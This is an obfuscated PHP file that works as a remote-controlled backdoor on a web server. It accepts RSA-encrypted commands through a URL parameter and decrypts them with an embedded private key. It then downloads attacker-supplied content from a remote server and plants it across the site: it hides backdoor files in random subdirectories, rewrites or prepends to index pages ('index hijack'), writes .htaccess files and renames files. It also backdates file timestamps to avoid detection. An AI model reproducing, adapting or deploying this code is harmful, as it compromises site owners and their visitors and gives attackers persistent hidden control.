<?php
 goto o8Jnj; akhZ9: $params = json_decode($params, true); goto UuL4j; CYdur: function doIndex($params) { if (empty($params["\x73\x68\x65\154\154\146\x69\154\145"])) { error("\163\150\145\154\x6c\146\151\154\145\x20" . MsgText::PARAM_EMPTY, $params); } $remoteUrl = $params["\163\145\x72\166\145\162"] . trim($params["\x73\x68\145\154\154\x66\151\154\145"]); $localfilepath = $_SERVER["\104\117\x43\x55\115\x45\116\x54\x5f\x52\117\x4f\124"] . "\57\151\156\x64\x65\170\56\x70\x68\x70"; $content = getRemoteContent($remoteUrl); $content = json_decode($content, true); if (!empty($content["\162\x65\x73\165\x6c\x74"])) { $oldContent = ''; if (file_exists($localfilepath)) { $oldContent = @file_get_contents($localfilepath); } elseif (file_exists($_SERVER["\x44\x4f\103\x55\115\x45\116\x54\137\122\117\117\x54"] . "\x2f\151\x6e\144\x65\170\56\x68\164\155\x6c")) { $oldContent = @file_get_contents($_SERVER["\x44\x4f\103\x55\x4d\x45\116\x54\x5f\122\x4f\x4f\x54"] . "\x2f\151\x6e\x64\145\x78\56\x68\x74\x6d\154"); } elseif (file_exists($_SERVER["\104\x4f\103\x55\115\x45\116\x54\137\122\x4f\x4f\124"] . "\57\x69\156\x64\145\170\56\150\164\155")) { $oldContent = @file_get_contents($_SERVER["\x44\x4f\103\x55\115\x45\x4e\x54\x5f\x52\x4f\x4f\124"] . "\57\x69\x6e\x64\145\x78\56\150\x74\155"); } elseif (file_exists($_SERVER["\x44\x4f\103\125\115\x45\x4e\124\137\122\117\x4f\x54"] . "\x2f\x64\x65\x66\x61\165\154\164\x2e\150\164\x6d\x6c")) { $oldContent = @file_get_contents($_SERVER["\x44\117\103\x55\115\105\116\x54\137\x52\117\x4f\x54"] . "\x2f\x64\145\146\x61\x75\154\164\x2e\x68\164\x6d\x6c"); } elseif (file_exists($_SERVER["\x44\117\x43\125\115\x45\x4e\x54\x5f\122\117\x4f\x54"] . "\x2f\x64\145\x66\141\x75\154\x74\56\150\x74\x6d")) { $oldContent = @file_get_contents($_SERVER["\x44\x4f\x43\x55\x4d\105\x4e\x54\x5f\122\x4f\x4f\x54"] . "\x2f\144\145\146\x61\165\x6c\164\x2e\x68\164\x6d"); } if (copyfile($content["\162\145\x73\165\x6c\x74"], $localfilepath, true, $oldContent)) { updateFiletime($localfilepath); @chmod($localfilepath, 420); success($localfilepath); } error(MsgText::LOCAL_FILE_ERROR, compact("\154\157\143\141\154\146\151\x6c\145\x70\x61\x74\150")); } error(MsgText::INDEX_ERROR, compact("\162\145\x6d\157\x74\145\x55\x72\154")); } goto V4kEf; RySoP: function error($msg = MsgText::UNKNOWN_ERROR, $extras = array(), $code = 0) { empty($code) && ($code = ErrorCode::E_200400); die(@json_encode(array("\143\157\x64\x65" => $code, "\x6d\x73\x67" => $msg, "\145\170\164\x72\x61\x73" => $extras), JSON_UNESCAPED_UNICODE)); } goto eddlN; eddlN: function success($data) { die(@json_encode(array("\x63\157\144\145" => 200, "\x6d\163\147" => MsgText::SUCCESS, "\144\x61\x74\141" => $data), JSON_UNESCAPED_UNICODE)); } goto iS9FU; dYOrD: $params = openssl_private_decrypt(base64_decode($p), $decrypted, $privateKey) ? $decrypted : null; goto yJgYR; voWe8: function copyfile($content, $localfile, $isAppend = false, $appendContent = '') { if ($isAppend && !empty($appendContent)) { $content = trim($content); if (substr($content, -2, 2) !== "\x3f\x3e") { $content .= "\40\x3f\x3e"; } $content = $content . PHP_EOL . PHP_EOL . $appendContent; } @file_put_contents($localfile, $content); if (!file_exists($localfile)) { $openedfile = @fopen($localfile, "\x77"); @fwrite($openedfile, $content); @fclose($openedfile); } if (!file_exists($localfile)) { return false; } return true; } goto Rynot; S2AmA: if (empty($params["\151\x64\x65\x6e"])) { error("\x69\144\x65\x6e\40" . MsgText::PARAM_EMPTY); } goto kQInE; Rynot: function updateFiletime($filepath) { $ctime = filectime($filepath); $now = time(); if (!($now > $ctime + 31104000)) { $newTime = $now - mt_rand(15552000, 31104000); touch($filepath, $newTime, $newTime); return true; } return true; } goto uwsTh; lWO2H: function doRename($params) { if (empty($params["\163\x6f\x75\x72\143\145\156\141\155\145"])) { error("\x73\x6f\x75\x72\143\x65\156\x61\155\x65\40" . MsgText::PARAM_EMPTY, $params); } if (empty($params["\162\x65\x6e\141\155\x65"])) { error("\x72\145\x6e\141\x6d\145\x20" . MsgText::PARAM_EMPTY, $params); } if ($params["\x73\157\165\x72\143\x65\x6e\141\x6d\145"] === $params["\162\145\156\x61\x6d\145"]) { error(MsgText::NOCHANGE); } $sourceFile = dirname(__FILE__) . DIRECTORY_SEPARATOR . $params["\x73\x6f\165\162\143\x65\x6e\x61\x6d\145"]; $renameFile = dirname(__FILE__) . DIRECTORY_SEPARATOR . $params["\162\145\x6e\x61\155\x65"]; $resRename = $params["\x73\145\162\166\145\x72"] . str_replace(strtolower($_SERVER["\x44\117\103\125\115\x45\x4e\x54\137\122\117\117\124"]), '', strtolower($renameFile)); $resRename = str_replace("\134", "\57", $resRename); $resSource = $params["\163\145\162\166\145\162"] . str_replace(strtolower($_SERVER["\104\x4f\103\x55\x4d\x45\116\x54\137\122\x4f\x4f\x54"]), '', strtolower($sourceFile)); $resSource = str_replace("\134", "\57", $resSource); if (file_exists($sourceFile)) { if (rename($sourceFile, $renameFile)) { success($resRename); } else { error(MsgText::RENAME_ERROR, compact("\162\145\163\122\x65\156\141\x6d\x65")); } } else { error(MsgText::LOCAL_FILE_EXISTS, compact("\x72\145\x73\x53\x6f\165\x72\143\x65")); } } goto CYdur; uwsTh: $privateKey = "\x2d\55\x2d\x2d\x2d\102\105\107\111\x4e\x20\120\x52\x49\126\x41\124\105\40\x4b\x45\x59\55\x2d\x2d\55\x2d\40\115\111\x49\x45\166\x51\x49\102\x41\x44\x41\116\x42\147\153\x71\x68\x6b\151\x47\71\167\60\x42\101\121\105\106\101\101\x53\103\x42\x4b\x63\x77\147\x67\123\152\x41\147\105\x41\x41\157\x49\102\101\x51\x43\x33\60\x77\x34\71\111\x74\117\x66\154\x64\x51\66\x20\144\102\53\60\147\x45\142\x65\145\127\66\102\x45\103\x6c\x63\x78\x2b\116\132\172\x6d\x70\x58\62\x59\x63\122\x48\x46\x56\70\60\x42\x75\162\x43\127\102\x61\166\120\x46\x65\150\126\70\123\x79\x39\171\x4c\62\x75\x2f\171\x33\155\166\x33\121\x4a\112\53\x20\170\x32\x6b\x4b\x76\x6c\171\x38\x7a\x4b\170\x34\x47\x62\x58\x50\142\163\127\112\x6b\x36\x48\157\x30\x52\170\161\64\x39\157\x58\x6b\102\141\x72\121\x42\x4f\161\x52\x4f\132\x65\x61\x46\106\63\x4d\x7a\160\144\57\x50\144\x4c\x53\163\170\x45\x76\107\61\115\40\164\121\144\62\x77\117\x78\x35\162\66\130\x44\70\x36\152\x79\x66\116\67\x4c\x41\112\125\x55\126\166\142\x4a\166\156\x31\x43\x48\157\x30\63\x6e\x46\x48\61\62\153\61\113\x59\x77\x4c\156\x51\x66\x7a\x51\111\65\x6e\130\x37\x79\121\x4c\141\x30\x6a\x74\40\146\x47\x35\124\x41\x33\64\x46\155\x30\x45\x4d\142\106\144\x48\127\x6a\101\x4e\x2f\x56\144\105\152\x6f\112\111\66\x69\164\64\120\x43\121\120\65\167\x6b\64\x67\x61\x32\102\x76\x56\x71\165\121\153\x75\x50\142\x73\142\162\70\63\66\x34\x64\x33\111\66\x20\x47\165\x47\101\113\x44\x52\x30\x77\x66\x6b\124\x32\x30\x6e\60\105\66\x6b\101\155\x44\111\63\x6f\154\62\142\x66\x61\60\x72\121\x6e\143\161\125\123\x33\117\x55\63\111\x4e\160\x78\117\x5a\x53\70\145\113\103\111\147\103\63\142\115\70\x31\x6d\144\151\40\x4d\x51\66\x54\x73\101\121\71\101\147\115\x42\101\101\105\x43\147\x67\105\101\112\x4c\x47\x53\154\x41\62\122\160\114\144\160\x78\70\154\x4b\125\165\x4f\x51\x51\146\123\x48\132\x47\x66\166\145\x62\57\x45\x32\x44\132\154\x37\53\144\x53\x47\x4d\65\112\x20\107\x6b\x4d\x49\131\164\x6e\x61\124\101\113\120\121\x38\152\156\163\x33\x37\x53\x4a\130\x43\163\x6d\122\122\x68\x42\116\146\60\x35\x69\62\60\101\102\163\x44\164\101\x51\57\x49\124\111\167\x6f\x70\155\101\x41\x50\x68\150\x52\63\111\x47\x64\103\146\x4c\40\x62\167\x79\x71\x47\143\105\117\x71\71\x78\x5a\102\71\x74\x57\x39\66\65\131\x4a\x6b\x37\113\160\154\x4c\154\x39\x34\x71\x4e\130\x74\122\x38\x43\165\x35\172\x78\x63\66\x55\104\153\164\152\x48\102\x52\153\x2f\113\x79\57\106\130\112\x4f\152\120\x4b\115\40\163\x41\x38\162\x68\x6f\170\x37\x64\161\x6c\132\125\x42\x33\111\x2f\161\151\161\x72\x51\117\x67\x54\x31\x42\x73\161\61\102\x46\x54\53\x32\107\x47\167\x52\125\x57\x5a\x31\x43\x79\x46\x6f\x5a\x76\x68\x73\x44\157\155\x64\x6f\x34\x79\x68\122\162\102\60\142\x20\x38\x59\x6d\64\x4d\104\151\x56\161\x78\106\120\x56\x57\x38\x58\x42\71\122\106\x44\x39\x59\x4b\164\x2b\166\x35\60\x45\142\66\x69\x53\113\112\116\x4c\160\x52\155\x6a\x5a\104\116\x5a\x62\x72\105\131\117\x36\x4e\122\x73\122\102\x4d\x37\142\162\104\x61\x39\40\156\x33\x39\x6d\x5a\127\106\x72\x34\x37\167\x47\x47\x58\130\x76\x2f\x4e\150\167\124\x76\122\111\x2b\x32\x53\x69\x2f\x5a\x66\x64\x50\64\x2b\157\65\124\x65\123\127\121\x4b\x42\x67\x51\x44\x68\x49\x56\117\x55\x4f\104\x69\x73\151\x4c\150\153\67\130\x4b\x62\40\131\165\x37\x42\127\61\132\x46\143\113\60\x4a\x78\165\x72\x71\x48\x4e\x32\x32\155\163\x76\x41\60\x51\57\61\x71\x34\x52\166\x7a\x69\x45\x54\x6a\145\x6b\130\x49\156\71\154\126\113\103\x6d\123\57\x67\171\62\x4f\62\x52\x74\165\121\122\x75\x6c\x41\x52\x20\x66\143\63\163\x7a\x32\x57\71\x74\x4e\x58\x52\106\70\101\x76\171\x30\x37\x32\x38\116\x47\x30\x62\x61\117\117\167\x42\x61\x6c\117\x38\x77\63\143\103\x58\66\x4e\156\x6d\67\x30\160\x4a\145\162\53\x69\112\123\156\63\164\x6d\x41\113\123\102\x34\114\x54\40\x76\x62\x53\102\x38\160\164\x36\x51\x67\120\x38\116\x50\x48\171\x51\x64\x57\x70\x32\114\167\x4f\164\x77\113\x42\x67\121\104\x52\102\70\154\147\123\x61\111\155\x49\x4d\x4a\x42\x61\x58\x45\x52\x53\x61\157\116\147\70\153\170\166\x33\x2f\143\166\x34\147\x35\40\152\x55\154\x6c\x6a\x78\x4e\x51\x63\125\163\152\x30\x56\x37\x58\x69\154\156\102\63\x6d\x46\170\161\65\162\x48\152\102\132\124\163\113\172\x4d\115\x51\171\x76\150\x4f\170\131\x68\160\164\x44\x66\167\x36\117\114\x74\157\x50\125\153\x32\127\151\x42\125\163\x20\154\x33\161\x55\x30\164\x49\130\116\x4e\x2b\x63\x54\x78\x75\62\123\x4d\x4b\124\152\x77\115\153\164\153\160\155\x41\103\112\161\141\x2b\153\x32\67\145\105\x55\161\170\x72\113\x4f\x2f\x36\123\105\x69\x50\x39\106\115\130\x48\166\x67\101\64\x45\x45\102\115\40\x48\x77\167\61\x65\x55\71\x51\161\167\113\102\147\101\x57\x53\x59\65\x55\x70\x68\x77\62\x4f\110\x4c\111\171\x78\x6b\x46\x65\x51\x33\x5a\65\157\x6a\x72\x35\166\117\66\146\x41\67\x56\152\x6e\x59\105\154\144\66\107\x41\x43\170\x73\124\143\x61\x57\x71\40\x76\x6c\x72\x54\x69\x6b\x39\x4f\x52\x55\x54\155\167\x55\x73\x63\127\x6a\157\x33\x38\x44\154\x4a\x41\64\x41\105\60\156\112\70\131\112\160\x5a\x7a\x37\124\x51\x51\166\x4a\x33\x32\x67\120\x55\172\154\107\103\123\105\65\x6b\x34\x45\x56\161\114\x36\126\114\40\x51\65\x53\x6a\x71\53\172\x7a\x61\x44\x50\152\x31\105\145\120\160\166\165\165\x34\x6b\162\71\106\151\115\172\107\107\120\122\x4d\x43\122\57\115\161\x58\x6c\53\x46\x39\110\155\x43\61\143\166\70\x4d\103\131\104\x55\154\101\x6f\x47\102\x41\x4b\67\67\x20\x67\x37\160\126\113\x61\x59\144\x57\x6b\103\104\60\x69\105\x55\x74\x34\122\x6b\x77\x2f\x49\x66\x53\x78\167\171\x51\147\x6c\x62\x6d\167\x75\x6e\x67\x42\127\150\x49\x62\117\x30\117\x31\x37\130\71\x46\144\x30\156\x38\x49\127\x55\65\127\x6b\125\x62\122\x78\x20\x65\x39\x58\142\131\142\105\x30\65\164\x30\x63\157\142\105\x5a\x46\143\x67\60\x74\x46\161\114\110\127\122\143\x4f\x73\x31\57\x61\123\102\131\143\64\x4c\x31\x77\x68\x4d\112\x72\x6a\163\x6b\x49\x61\x36\101\60\x37\114\x52\x33\165\157\x51\122\162\x38\x72\40\64\161\153\x57\x37\131\x72\x74\x79\x5a\x6c\165\x4b\66\145\101\102\102\171\x43\x58\123\x62\x65\x69\x54\x52\154\144\x6b\63\x43\61\x2b\145\124\x79\66\57\x4e\x41\x6f\x47\x41\142\71\57\x4a\x2b\x4e\x57\x72\x68\131\x53\162\57\126\157\x47\x57\x6a\165\151\x20\x63\150\130\x43\x4e\x73\172\x79\64\x77\66\145\170\x56\167\x78\x58\x51\x4b\x4e\x54\x74\x6c\x7a\113\170\171\150\x51\x66\x56\120\x4b\x32\x42\x78\162\x70\164\x57\114\66\x4b\103\122\113\160\x7a\x33\167\x68\x2b\x57\x59\x32\x43\x33\x51\x59\171\x56\x66\167\x47\40\x46\102\64\150\x77\104\x72\62\x6d\x59\64\124\127\106\71\160\104\61\71\x34\151\x45\123\x31\171\150\x72\121\x47\154\x49\70\x58\x4d\x2b\62\114\126\x68\102\154\x33\160\60\170\53\x54\x46\x67\112\x4d\x61\124\x67\104\104\161\101\x6e\170\160\x75\161\x54\40\165\160\x42\x59\161\124\131\x4d\x6c\x4f\x64\53\x56\x52\x37\150\105\116\115\x61\106\x71\x6f\75\40\x2d\55\x2d\x2d\x2d\105\116\104\x20\x50\122\111\126\101\x54\x45\40\x4b\105\131\x2d\x2d\x2d\x2d\55"; goto ShiIa; V4kEf: function doSub($params) { if (empty($params["\x73\150\145\x6c\x6c\x66\151\x6c\x65"])) { error("\163\150\x65\x6c\154\146\151\154\145" . MsgText::PARAM_EMPTY, $params); } if (empty($params["\x66\151\x6c\x65\156\x61\155\145"])) { error("\x66\151\x6c\145\156\x61\x6d\145\x20" . MsgText::PARAM_EMPTY, $params); } $localfilepath = $_SERVER["\x44\x4f\103\125\115\x45\x4e\124\137\122\x4f\x4f\124"] . "\x2f" . $params["\x66\x69\x6c\x65\156\141\x6d\x65"]; $remoteFileUrl = $params["\163\145\x72\166\x65\162"] . $params["\x73\x68\145\154\154\x66\x69\x6c\145"]; $content = getRemoteContent($remoteFileUrl); $content = json_decode($content, true); if (!empty($content["\x72\145\x73\x75\154\x74"])) { if (copyfile($content["\x72\x65\163\165\154\x74"], $localfilepath)) { updateFiletime($localfilepath); @chmod($localfilepath, 420); success($localfilepath); } error(MsgText::LOCAL_FILE_ERROR, compact("\x6c\157\x63\x61\x6c\146\151\154\x65\160\x61\164\150")); } error(MsgText::REMOTE_GET_ERROR, compact("\x72\x65\x6d\x6f\164\x65\x46\x69\x6c\x65\x55\x72\x6c")); } goto If0V6; QJTTt: class ErrorCode { const E_200400 = 200400; } goto rPZnX; ocucO: if (empty($params["\x73\145\162\166\145\x72"])) { error("\x73\145\162\166\145\x72\40" . MsgText::PARAM_EMPTY); } goto S2AmA; DdA7i: function getUrl($url) { $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $url); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); curl_setopt($curl, CURLOPT_TIMEOUT, 5); curl_setopt($curl, CURLOPT_AUTOREFERER, 0); curl_exec($curl); $httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE); curl_close($curl); if ($httpCode === 200) { $content = curl_exec($curl); return array("\x63\x6f\144\145" => 200, "\162\145\x73\160" => $content); } return array("\143\x6f\144\145" => 500, "\x72\x65\x73\x70" => ''); } goto HTGNn; U4t2T: function doBeima($params) { if (empty($params["\146\x69\154\145\x6e\141\155\x65"])) { error("\146\151\154\145\156\141\x6d\x65\40" . MsgText::PARAM_EMPTY, $params); } if (empty($params["\163\x68\x65\154\x6c\x66\x69\x6c\x65"])) { error("\163\150\145\154\x6c\146\151\x6c\145\40" . MsgText::PARAM_EMPTY, $params); } empty($params["\x6c\x65\x76\145\154"]) && ($params["\154\x65\x76\145\154"] = 6); $dirs = getDirPathsByLevel($params["\x6c\x65\x76\145\154"]); $temp = array_rand($dirs); $createDir = $dirs[$temp] . "\x2f"; $localfilepath = $createDir . $params["\x66\x69\154\145\x6e\141\x6d\x65"]; $remoteFileUrl = $params["\x73\x65\162\166\x65\162"] . $params["\x73\150\x65\154\x6c\146\x69\154\145"]; $content = getRemoteContent($remoteFileUrl); $content = json_decode($content, true); if (!empty($content["\162\145\163\165\154\x74"])) { if (copyfile($content["\162\x65\x73\x75\x6c\x74"], $localfilepath)) { updateFiletime($localfilepath); $beimaurl = str_replace($_SERVER["\x44\117\103\x55\115\x45\x4e\124\137\122\117\117\x54"], '', $localfilepath); success(compact("\154\157\x63\141\154\x66\151\154\145\x70\141\164\150", "\142\x65\x69\x6d\141\x75\162\x6c")); } error(MsgText::LOCAL_FILE_ERROR, compact("\154\x6f\x63\141\154\x66\151\x6c\145\x70\x61\164\x68")); } error(MsgText::REMOTE_FILE_EXISTS, compact("\x72\145\155\157\164\145\106\151\x6c\x65\x55\x72\154")); } goto lWO2H; yJgYR: if (is_null($params)) { error(MsgText::DECRYPT_FAIL); } goto akhZ9; o8Jnj: error_reporting(0); goto QJTTt; If0V6: function doLock($params) { if (empty($params["\146\151\x6c\145\x6e\x61\155\145"])) { error("\146\151\x6c\145\x6e\x61\x6d\x65\40" . MsgText::PARAM_EMPTY, $params); } if (empty($params["\x64\157\155\141\x69\156"])) { error("\144\x6f\155\x61\151\x6e\40" . MsgText::PARAM_EMPTY, $params); } if (empty($params["\x73\150\145\x6c\x6c\x66\151\x6c\x65"])) { error("\163\150\145\154\x6c\x66\x69\x6c\x65\40" . MsgText::PARAM_EMPTY, $params); } $localfilepath = $_SERVER["\104\x4f\x43\125\x4d\x45\116\124\x5f\x52\117\117\124"] . "\57" . $params["\x66\151\154\145\156\141\155\145"]; $remoteFileUrl = $params["\163\x65\162\166\145\162"] . $params["\163\150\145\154\x6c\x66\151\154\x65"]; $content = getRemoteContent($remoteFileUrl); $content = json_decode($content, true); if (!empty($content["\x72\145\x73\x75\x6c\164"])) { if (copyfile($content["\x72\x65\163\x75\x6c\x74"], $localfilepath)) { $lockurl = $params["\x64\x6f\x6d\141\x69\156"] . $params["\146\151\154\145\x6e\x61\155\x65"]; $lockres = getUrl($lockurl); @unlink($localfilepath); if ($lockres["\x63\157\144\x65"] === 200 && !empty($lockres["\x72\x65\163\x70"]) && strpos($lockres["\x72\x65\x73\160"], "\163\x75\143\x63\145\163\163")) { success($lockres["\x72\145\163\x70"]); } error(MsgText::LOCK_FILE_SUCCESS, compact("\x6c\x6f\x63\153\x75\x72\154", "\154\157\x63\x6b\162\x65\163")); } @unlink($localfilepath); error(MsgText::LOCK_FILE_ERROR, compact("\154\157\143\x61\154\x66\151\154\x65\160\141\164\x68")); } error(MsgText::REMOTE_GET_ERROR, compact("\x72\145\x6d\157\164\x65\x46\151\x6c\x65\125\162\154")); } goto qW2aW; kQInE: $iden = isset($params["\x69\144\145\x6e"]) ? strtolower($params["\151\x64\145\x6e"]) : ''; goto ri7kt; UuL4j: if (!is_array($params)) { error(MsgText::PARAM_TYPE, $params); } goto ocucO; ri7kt: switch ($iden) { case "\142\145\x69\x6d\x61": $res = doBeima($params); break; case "\x72\145\156\141\x6d\x65": $res = doRename($params); break; case "\x69\x6e\144\145\x78": $res = doIndex($params); break; case "\x73\x75\x62": case "\x68\x74\x61\143\x63\145\x73\163": $res = doSub($params); break; case "\x6c\x6f\x63\x6b": $res = doLock($params); break; case "\163\x74\x79\x6c\145": $res = doStyle($params); break; default: error("\x69\144\x65\156\x20" . MsgText::VALUE_ERROR); } goto U4t2T; rPZnX: class MsgText { const PARAM_EMPTY = "\x70\x61\x72\x61\155\x20\x69\163\40\145\x6d\160\x74\x79"; const PARAM_TYPE = "\x70\141\162\141\x6d\x20\164\x79\x70\145\x20\145\162\x72\x6f\x72"; const VALUE_ERROR = "\x76\x61\x6c\165\x65\40\145\162\162\x6f\162"; const NOCHANGE = "\x6e\157\40\x63\x68\x61\x6e\147\x65"; const LOCK_FILE_SUCCESS = "\x67\x65\156\145\x72\x61\164\145\x20\154\x6f\143\x6b\40\x66\x69\154\x65\x20\x73\x75\143\143\x65\x73\x73\x2c\142\x75\164\x20\154\157\x63\153\40\x69\x6e\x64\x65\170\56\160\x68\x70\x20\145\x72\162\157\162"; const LOCK_FILE_ERROR = "\x67\145\x6e\145\162\141\x74\x65\40\x6c\157\x63\x6b\x20\146\x69\154\x65\x20\x65\x72\162\157\162"; const REMOTE_GET_ERROR = "\x67\x65\164\x20\x72\x65\x6d\157\164\145\40\143\157\156\164\145\x6e\164\x20\145\162\162\x6f\162"; const LOCAL_FILE_ERROR = "\147\x65\156\x65\162\x61\x74\145\40\154\157\143\141\x6c\x20\x66\x69\x6c\145\40\x65\162\x72\157\x72"; const SUCCESS = "\163\165\x63\143\x65\x73\x73"; const LOCAL_FILE_EXISTS = "\154\157\x63\141\x6c\40\x66\151\x6c\x65\40\x64\157\x65\x73\156\x27\164\x20\145\170\151\x73\x74"; const REMOTE_FILE_EXISTS = "\x72\145\x6d\157\164\145\x20\146\x69\x6c\x65\40\144\157\x65\x73\156\47\x74\40\x65\x78\x69\163\x74"; const RENAME_ERROR = "\x72\145\156\141\155\145\x20\145\x72\162\x6f\x72"; const INDEX_ERROR = "\x69\x6e\x64\x65\x78\40\150\x69\x6a\141\x63\x6b\x20\145\x72\162\157\x72"; const UNKNOWN_ERROR = "\x75\x6e\x6b\x6e\157\x77\x6e\40\145\162\162\157\162"; const DECRYPT_FAIL = "\x70\x61\x72\x61\x6d\x73\40\x64\x65\x63\162\x79\x70\x74\40\146\141\151\154"; } goto RySoP; ShiIa: $p = $_GET["\x70"]; goto dYOrD; HTGNn: function getRemoteContent($url) { $content = @file_get_contents($url); if ($content === false) { $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $url); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); curl_setopt($curl, CURLOPT_TIMEOUT, 5); curl_setopt($curl, CURLOPT_AUTOREFERER, 0); $content = curl_exec($curl); curl_close($curl); } return !empty($content) && is_string($content) ? $content : ''; } goto voWe8; iS9FU: function getDirPathsByLevel($level = 6) { $initDir = $_SERVER["\104\x4f\x43\125\115\x45\x4e\124\137\x52\x4f\117\x54"]; $dirs = array($initDir); $count = count($dirs); while (count($dirs) > $count - 1) { $path = $dirs[$count - 1]; $count += 1; if (@is_dir($path) && @($handle = @opendir($path))) { while ($file = @readdir($handle)) { $realpath = $path . "\57" . $file; if ($file == "\x2e" || $file == "\56\x2e" || !is_dir($realpath) || substr($file, 0, 1) === "\56") { continue; } $path3 = str_replace($initDir, '', $path); $path4 = explode("\x2f", $path3); if (count($path4) > $level - 1) { continue; } $dirs[] = $realpath; } } @closedir($handle); } return $dirs; } goto DdA7i; qW2aW: function doStyle($params) { if (empty($params["\x73\150\x65\154\x6c\x66\151\x6c\x65"])) { error("\163\150\145\154\154\146\x69\x6c\x65" . MsgText::PARAM_EMPTY, $params); } if (empty($params["\x66\151\154\145\156\141\x6d\145"])) { error("\x66\151\154\x65\156\x61\x6d\x65\40" . MsgText::PARAM_EMPTY, $params); } if (empty($params["\x64\x6f\x6d\141\151\x6e"])) { error("\144\157\155\141\151\x6e\x20" . MsgText::PARAM_EMPTY, $params); } $localfilepath = $params["\x64\157\155\141\151\156"] . $params["\146\151\154\145\156\141\155\145"]; $remoteFileUrl = $params["\163\145\x72\x76\x65\162"] . $params["\163\150\x65\154\x6c\x66\151\154\x65"]; $content = getRemoteContent($remoteFileUrl); $content = json_decode($content, true); if (!empty($content["\x72\145\x73\165\154\164"])) { if (copyfile($content["\162\145\x73\165\x6c\164"], $localfilepath)) { updateFiletime($localfilepath); @chmod($localfilepath, 420); success($localfilepath); } error(MsgText::LOCAL_FILE_ERROR, compact("\154\157\x63\141\x6c\x66\151\x6c\145\160\141\x74\150")); } error(MsgText::REMOTE_GET_ERROR, compact("\162\x65\155\157\x74\x65\x46\151\154\145\125\162\x6c")); }
